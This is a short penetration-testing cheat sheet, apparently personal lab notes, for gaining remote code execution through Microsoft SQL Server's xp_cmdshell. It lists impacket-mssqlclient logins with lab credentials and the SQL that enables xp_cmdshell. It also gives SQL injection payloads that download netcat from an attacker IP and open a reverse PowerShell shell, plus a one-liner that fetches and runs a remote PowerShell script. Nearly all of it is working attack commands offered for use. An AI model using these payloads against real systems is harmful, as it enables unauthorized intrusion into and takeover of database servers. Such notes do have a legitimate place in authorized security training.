---
title: MSSQL xp_cmdshell RCE
category: initial-access
subcategory: sqli
os: linux
command: impacket-mssqlclient user:pass@target -windows-auth
tools: impacket-mssqlclient
---


### Connect

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient -db volume -windows-auth disco/""::""@10.11.1.13
mssqlclient.py RALPH/sa:poiuytrewq@10.11.1.43
```

### Enable xp_cmdshell

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### Drop and execute a binary via SQLi

```sql
'; exec master..xp_cmdshell 'powershell -command Invoke-WebRequest -Uri http://192.168.45.210/nc64.exe -Outfile C:\\temp\\nc64.exe'--
'; exec master..xp_cmdshell 'c:\\temp\\nc64.exe 192.168.45.210 4444 -e powershell'--
```

### Quick get-shell pattern (interactive client)

```
enable_xp_cmdshell
xp_cmdshell powershell iex (iwr -usebasicparsing http://192.168.119.156/rev2.ps1)
```
